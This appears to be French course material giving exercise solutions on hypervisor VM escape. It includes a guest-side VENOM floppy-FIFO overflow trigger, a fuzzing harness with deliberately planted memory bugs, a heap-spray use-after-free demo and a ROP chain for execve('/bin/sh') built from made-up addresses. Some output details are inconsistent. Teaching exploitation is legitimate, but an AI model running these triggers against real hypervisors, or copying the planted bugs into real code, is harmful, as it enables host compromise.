# Solutions - VM Escape Concepts

## Solution Exercice 1 : Analyse d'une vulnérabilité VM Escape (Très facile)

### Objectif
Comprendre le fonctionnement d'une vulnérabilité historique.

### Analyse de VENOM (CVE-2015-3456)

VENOM (Virtualized Environment Neglected Operations Manipulation) est une vulnérabilité critique dans l'émulation du contrôleur floppy de QEMU.

#### Code vulnérable simplifié

```c
/*
 * Code vulnérable du contrôleur floppy QEMU (simplifié)
 * La vraie vulnérabilité est plus complexe
 */

#define FIFO_SIZE 16

typedef struct FDCtrl {
    uint8_t fifo[FIFO_SIZE];  // Buffer FIFO de 16 octets
    int fifo_pos;             // Position actuelle dans le FIFO
    uint8_t status;
} FDCtrl;

/*
 * Fonction qui reçoit des données du guest
 * VULNÉRABILITÉ : Pas de vérification de bounds
 */
void fdctrl_write_data(FDCtrl *fdctrl, uint8_t value) {
    // BUG : Pas de vérification si fifo_pos >= FIFO_SIZE
    fdctrl->fifo[fdctrl->fifo_pos++] = value;  // <-- OVERFLOW ICI

    // Le fifo_pos peut dépasser 16, écrivant au-delà du buffer
}

/*
 * Le guest peut appeler cette fonction via des I/O ports
 */
void handle_floppy_io(FDCtrl *fdctrl, uint16_t port, uint8_t value) {
    if (port == FLOPPY_DATA_PORT) {
        fdctrl_write_data(fdctrl, value);
    }
}
```

#### Exploitation conceptuelle

```c
/*
 * Exploit VENOM depuis le guest
 */
#include <stdio.h>
#include <sys/io.h>

#define FLOPPY_DATA_PORT 0x3F5
#define FLOPPY_STATUS_PORT 0x3F4

int exploit_venom(void) {
    // Obtenir l'accès aux ports I/O (nécessite root dans le guest)
    if (ioperm(FLOPPY_DATA_PORT, 2, 1) != 0) {
        perror("ioperm");
        return -1;
    }

    printf("[*] Exploitation VENOM (CVE-2015-3456)\n");

    // Envoyer plus de 16 octets pour overflow le FIFO
    printf("[*] Envoi de 100 octets vers le FIFO (capacité : 16)\n");

    for (int i = 0; i < 100; i++) {
        outb(0x41, FLOPPY_DATA_PORT);  // 'A' en ASCII

        // Chaque écriture incrémente fifo_pos sans vérification
        // Après 16 écritures, on écrit au-delà du buffer
    }

    printf("[+] Overflow déclenché !\n");
    printf("    Les octets 17-100 ont corrompu la mémoire de l'hyperviseur\n");

    return 0;
}

int main(void) {
    printf("=== Démonstration VENOM (éducatif) ===\n\n");

    exploit_venom();

    printf("\n[*] Dans un vrai exploit :\n");
    printf("    1. Leak d'adresses (ASLR bypass)\n");
    printf("    2. ROP chain pour désactiver DEP\n");
    printf("    3. Shellcode pour exécution de code sur l'hôte\n");

    return 0;
}
```

### Explications détaillées

**Pourquoi c'est dangereux ?**

1. **Buffer overflow** : `fifo_pos++` sans limite permet d'écrire au-delà du tableau
2. **Corruption mémoire** : Les octets après `fifo[16]` appartiennent à d'autres structures
3. **Contrôle RIP** : En écrasant des pointeurs de fonction, on peut rediriger l'exécution
4. **VM Escape** : Le code s'exécute dans l'hyperviseur, pas dans le guest

**Patch de sécurité**

```c
void fdctrl_write_data(FDCtrl *fdctrl, uint8_t value) {
    // FIX : Vérifier les bounds avant d'écrire
    if (fdctrl->fifo_pos >= FIFO_SIZE) {
        fprintf(stderr, "FIFO overflow detected, ignoring write\n");
        return;  // Ignorer l'écriture si le buffer est plein
    }

    fdctrl->fifo[fdctrl->fifo_pos++] = value;
}
```

---

## Solution Exercice 2 : Fuzzing d'un device QEMU (Facile)

### Objectif
Utiliser AFL pour trouver des bugs dans un émulateur.

### Setup du fuzzing

```c
/*
 * Harness de fuzzing pour un device QEMU virtuel
 * Ce code simule un device avec des bugs intentionnels
 */

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>

#define DEVICE_BUFFER_SIZE 256

// Structure du device (similaire à QEMU)
typedef struct {
    uint8_t buffer[DEVICE_BUFFER_SIZE];
    uint32_t size;
    uint32_t command;
} VirtualDevice;

VirtualDevice device = {0};

/*
 * Fonction vulnérable : traite les commandes du guest
 * Contient plusieurs bugs pour le fuzzing
 */
void process_device_command(uint8_t *input, size_t input_size) {
    if (input_size < 4) return;

    uint32_t command = *(uint32_t*)input;
    device.command = command;

    switch (command) {
        case 0x01:  // CMD_WRITE
            // BUG 1 : Integer overflow
            device.size = *(uint32_t*)(input + 4);

            if (input_size >= 8 + device.size) {
                // BUG 2 : Buffer overflow si size > DEVICE_BUFFER_SIZE
                memcpy(device.buffer, input + 8, device.size);
            }
            break;

        case 0x02:  // CMD_READ
            // BUG 3 : Out-of-bounds read
            uint32_t offset = *(uint32_t*)(input + 4);
            uint32_t length = *(uint32_t*)(input + 8);

            // Pas de vérification : peut lire hors du buffer
            for (uint32_t i = 0; i < length; i++) {
                printf("%02x ", device.buffer[offset + i]);
            }
            break;

        case 0x03:  // CMD_PROCESS
            // BUG 4 : Use-after-free (simulation)
            uint8_t *temp = malloc(device.size);
            memcpy(temp, device.buffer, device.size);
            free(temp);

            // temp est freed mais réutilisé
            if (device.command == 0x03) {
                printf("%s\n", temp);  // UAF
            }
            break;

        default:
            printf("Unknown command\n");
    }
}

/*
 * Main pour AFL fuzzing
 */
int main(int argc, char **argv) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <input_file>\n", argv[0]);
        return 1;
    }

    // Lire le fichier d'entrée (fourni par AFL)
    FILE *fp = fopen(argv[1], "rb");
    if (!fp) {
        perror("fopen");
        return 1;
    }

    fseek(fp, 0, SEEK_END);
    size_t size = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    uint8_t *input = malloc(size);
    fread(input, 1, size, fp);
    fclose(fp);

    // Traiter l'input (AFL va muter cet input pour trouver des crashes)
    process_device_command(input, size);

    free(input);
    return 0;
}
```

### Lancer le fuzzing avec AFL

```bash
# Compiler avec AFL
afl-gcc -o device_fuzz harness.c

# Créer les dossiers
mkdir afl_in afl_out

# Créer un input seed valide
echo -ne '\x01\x00\x00\x00\x10\x00\x00\x00AAAAAAAAAAAAAAAA' > afl_in/seed1

# Lancer AFL
afl-fuzz -i afl_in -o afl_out -- ./device_fuzz @@
```

### Résultat attendu

Après quelques minutes/heures, AFL trouvera des crashes :

```
[*] AFL a trouvé 3 crashes :

Crash 1 : Buffer overflow (CMD_WRITE avec size=0xFFFFFFFF)
Input : 01 00 00 00 FF FF FF FF 41 41 41 41 ...
  → memcpy overflow

Crash 2 : Out-of-bounds read (CMD_READ avec offset=1000)
Input : 02 00 00 00 E8 03 00 00 FF 00 00 00
  → Lecture hors buffer

Crash 3 : Use-after-free (CMD_PROCESS)
Input : 03 00 00 00 ...
  → Accès mémoire libérée
```

---

## Solution Exercice 3 : Heap Spray Attack (Moyen)

### Objectif
Préparer le heap pour exploiter un Use-After-Free.

### Code complet

```c
/*
 * Démonstration de Heap Spray pour exploitation UAF
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

// Simulation d'un objet QEMU vulnérable
typedef struct {
    void (*callback)(void);  // Pointeur de fonction
    uint8_t data[64];
    uint32_t id;
} QEMUObject;

// Fonction légitime
void legitimate_callback(void) {
    printf("[*] Callback légitime appelé\n");
}

// Fonction malveillante (notre objectif)
void malicious_callback(void) {
    printf("[!] EXPLOITATION RÉUSSIE !\n");
    printf("[!] Code malveillant exécuté dans l'hyperviseur\n");
    printf("[!] VM Escape simulé\n");

    // En pratique : shellcode pour accès root sur l'hôte
}

/*
 * Étape 1 : Allouer un objet
 */
QEMUObject* allocate_object(void) {
    QEMUObject *obj = malloc(sizeof(QEMUObject));
    obj->callback = legitimate_callback;
    obj->id = 0x1234;
    memset(obj->data, 0, sizeof(obj->data));

    printf("[+] Objet alloué à %p\n", (void*)obj);
    return obj;
}

/*
 * Étape 2 : Free (bug : dangling pointer)
 */
void free_object(QEMUObject *obj) {
    printf("[*] Libération de l'objet...\n");
    free(obj);
    // BUG : Le pointeur n'est pas mis à NULL
}

/*
 * Étape 3 : Heap Spray
 * On alloue plein d'objets pour contrôler le contenu de la zone freed
 */
void heap_spray(int count) {
    printf("[*] Heap spray : allocation de %d objets...\n", count);

    for (int i = 0; i < count; i++) {
        QEMUObject *spray = malloc(sizeof(QEMUObject));

        if (spray) {
            // Remplir avec notre callback malveillant
            spray->callback = malicious_callback;
            spray->id = 0xDEAD;
            memset(spray->data, 0x41, sizeof(spray->data));

            // On ne free pas pour garder le heap rempli
        }
    }

    printf("[+] Heap spray terminé\n");
}

/*
 * Étape 4 : Trigger UAF
 */
void trigger_uaf(QEMUObject *dangling) {
    printf("[*] Déclenchement du Use-After-Free...\n");

    // L'objet a été free mais le pointeur existe toujours
    // Grâce au heap spray, cette zone contient maintenant
    // notre objet malveillant

    printf("[*] Appel du callback...\n");
    dangling->callback();  // <-- UAF : peut exécuter malicious_callback
}

int main(void) {
    printf("=== Démonstration Heap Spray pour UAF ===\n\n");

    // Scénario d'exploitation

    printf("[Étape 1] Allocation d'un objet légitime\n");
    QEMUObject *obj = allocate_object();

    printf("\n[Étape 2] Test du callback légitime\n");
    obj->callback();

    printf("\n[Étape 3] Free de l'objet (bug : dangling pointer)\n");
    free_object(obj);

    printf("\n[Étape 4] Heap Spray avec objets malveillants\n");
    heap_spray(100);

    printf("\n[Étape 5] Trigger Use-After-Free\n");
    trigger_uaf(obj);  // obj pointe vers une zone freed

    printf("\n[*] Explication :\n");
    printf("    1. L'objet original a été free\n");
    printf("    2. Le heap spray a réalloué cette zone\n");
    printf("    3. La zone contient maintenant malicious_callback\n");
    printf("    4. L'appel à obj->callback() exécute notre code\n");

    return 0;
}
```

### Compilation et exécution

```bash
gcc -o heap_spray solution3.c
./heap_spray
```

### Résultat

```
=== Démonstration Heap Spray pour UAF ===

[Étape 1] Allocation d'un objet légitime
[+] Objet alloué à 0x55b8c0a022a0

[Étape 2] Test du callback légitime
[*] Callback légitime appelé

[Étape 3] Free de l'objet (bug : dangling pointer)
[*] Libération de l'objet...

[Étape 4] Heap Spray avec objets malveillants
[*] Heap spray : allocation de 100 objets...
[+] Heap spray terminé

[Étape 5] Trigger Use-After-Free
[*] Déclenchement du Use-After-Free...
[*] Appel du callback...
[!] EXPLOITATION RÉUSSIE !
[!] Code malveillant exécuté dans l'hyperviseur
[!] VM Escape simulé
```

---

## Solution Exercice 4 : ROP Chain Building (Difficile)

### Objectif
Construire une ROP chain pour bypasser DEP.

### Code complet

```c
/*
 * Construction d'une ROP chain pour exploitation
 *
 * Objectif : Exécuter execve("/bin/sh", NULL, NULL) en utilisant
 * uniquement des gadgets ROP (pas de code direct)
 */

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>

/*
 * Gadgets ROP (adresses fictives pour démonstration)
 * Dans un vrai exploit, ces adresses viendraient de l'hyperviseur
 */
#define POP_RDI_RET     0x0000000000401000  // pop rdi; ret
#define POP_RSI_RET     0x0000000000401001  // pop rsi; ret
#define POP_RDX_RET     0x0000000000401002  // pop rdx; ret
#define POP_RAX_RET     0x0000000000401003  // pop rax; ret
#define SYSCALL_RET     0x0000000000401004  // syscall; ret
#define BIN_SH_ADDR     0x0000000000402000  // "/bin/sh"

/*
 * Simule la vulnérabilité : stack overflow
 */
void vulnerable_function(char *input) {
    char buffer[64];

    printf("[*] Buffer à %p\n", (void*)buffer);
    printf("[*] Input size : %ld bytes\n", strlen(input));

    // Vulnérabilité : pas de vérification de taille
    strcpy(buffer, input);  // <-- OVERFLOW

    printf("[*] Return address sur la stack : %p\n",
           (void*)__builtin_return_address(0));
}

/*
 * Construit la ROP chain
 */
void build_rop_chain(uint64_t *rop, size_t *rop_size) {
    int i = 0;

    printf("[*] Construction de la ROP chain...\n\n");

    // Padding pour atteindre le saved RIP (64 bytes + 8 bytes RBP)
    for (int j = 0; j < 9; j++) {
        rop[i++] = 0x4141414141414141;  // 'AAAAAAAA'
    }

    printf("  [1] pop rdi; ret  -> charger \"/bin/sh\" dans RDI (arg1)\n");
    rop[i++] = POP_RDI_RET;
    rop[i++] = BIN_SH_ADDR;  // RDI = "/bin/sh"

    printf("  [2] pop rsi; ret  -> charger NULL dans RSI (arg2)\n");
    rop[i++] = POP_RSI_RET;
    rop[i++] = 0x0;  // RSI = NULL

    printf("  [3] pop rdx; ret  -> charger NULL dans RDX (arg3)\n");
    rop[i++] = POP_RDX_RET;
    rop[i++] = 0x0;  // RDX = NULL

    printf("  [4] pop rax; ret  -> charger 59 dans RAX (syscall execve)\n");
    rop[i++] = POP_RAX_RET;
    rop[i++] = 59;  // RAX = 59 (syscall number pour execve)

    printf("  [5] syscall; ret  -> exécuter execve(\"/bin/sh\", NULL, NULL)\n");
    rop[i++] = SYSCALL_RET;

    *rop_size = i;

    printf("\n[+] ROP chain construite (%ld gadgets)\n", *rop_size);
}

/*
 * Affiche la ROP chain en hexadécimal
 */
void print_rop_chain(uint64_t *rop, size_t size) {
    printf("\n[*] ROP Chain (hex) :\n");

    for (size_t i = 0; i < size; i++) {
        if (i < 9) {
            printf("  [%02ld] 0x%016lx  (padding)\n", i, rop[i]);
        } else {
            printf("  [%02ld] 0x%016lx\n", i, rop[i]);
        }
    }
}

/*
 * Simulation d'exploitation
 */
void simulate_exploit(void) {
    uint64_t rop_chain[100];
    size_t rop_size;

    printf("╔══════════════════════════════════════════════════════════╗\n");
    printf("║         ROP Chain Exploit Simulation                    ║\n");
    printf("╚══════════════════════════════════════════════════════════╝\n\n");

    // Construire la ROP chain
    build_rop_chain(rop_chain, &rop_size);

    // Afficher
    print_rop_chain(rop_chain, rop_size);

    printf("\n[*] Explication :\n");
    printf("    1. Le buffer overflow écrase le saved RIP\n");
    printf("    2. Au lieu de retourner normalement, le CPU exécute nos gadgets\n");
    printf("    3. Chaque gadget configure un registre (RDI, RSI, RDX, RAX)\n");
    printf("    4. Le gadget 'syscall' lance execve(\"/bin/sh\")\n");
    printf("    5. DEP bypassed : on n'a injecté aucun code, juste des adresses\n");

    printf("\n[*] Dans un vrai exploit VM Escape :\n");
    printf("    - Trouver les gadgets dans le binaire QEMU\n");
    printf("    - Leak des adresses (ASLR bypass)\n");
    printf("    - Trigger la vulnérabilité depuis le guest\n");
    printf("    - Shell root sur l'hôte\n");

    printf("\n[!] NOTE : Ceci est une simulation éducative\n");
    printf("    La vraie ROP chain nécessiterait des adresses réelles\n");
}

int main(void) {
    simulate_exploit();
    return 0;
}
```

### Compilation et exécution

```bash
gcc -o rop_chain solution4.c -no-pie
./rop_chain
```

### Résultat

```
╔══════════════════════════════════════════════════════════╗
║         ROP Chain Exploit Simulation                    ║
╚══════════════════════════════════════════════════════════╝

[*] Construction de la ROP chain...

  [1] pop rdi; ret  -> charger "/bin/sh" dans RDI (arg1)
  [2] pop rsi; ret  -> charger NULL dans RSI (arg2)
  [3] pop rdx; ret  -> charger NULL dans RDX (arg3)
  [4] pop rax; ret  -> charger 59 dans RAX (syscall execve)
  [5] syscall; ret  -> exécuter execve("/bin/sh", NULL, NULL)

[+] ROP chain construite (14 gadgets)

[*] ROP Chain (hex) :
  [00] 0x4141414141414141  (padding)
  [01] 0x4141414141414141  (padding)
  ...
  [09] 0x0000000000401000
  [10] 0x0000000000402000
  [11] 0x0000000000401001
  [12] 0x0000000000000000
  [13] 0x0000000000401002
  [14] 0x0000000000000000
  [15] 0x0000000000401003
  [16] 0x000000000000003b
  [17] 0x0000000000401004
```

---

## Points clés à retenir

1. **VM Escape** exploite les bugs de l'hyperviseur (buffer overflow, UAF, etc.)
2. **Heap Spray** permet de contrôler le contenu du heap après un free
3. **ROP** permet d'exécuter du code malgré DEP/NX
4. **Fuzzing** est essentiel pour découvrir des vulnérabilités
5. L'exploitation nécessite : leak d'adresses, ROP chain, shellcode

## Impact en environnement cloud

Un VM Escape dans AWS/Azure/GCP permettrait :
- **Compromission multi-tenant** : accès aux VMs voisines
- **Exfiltration de données** : credentials, secrets
- **Persistance infrastructure** : backdoor au niveau hyperviseur
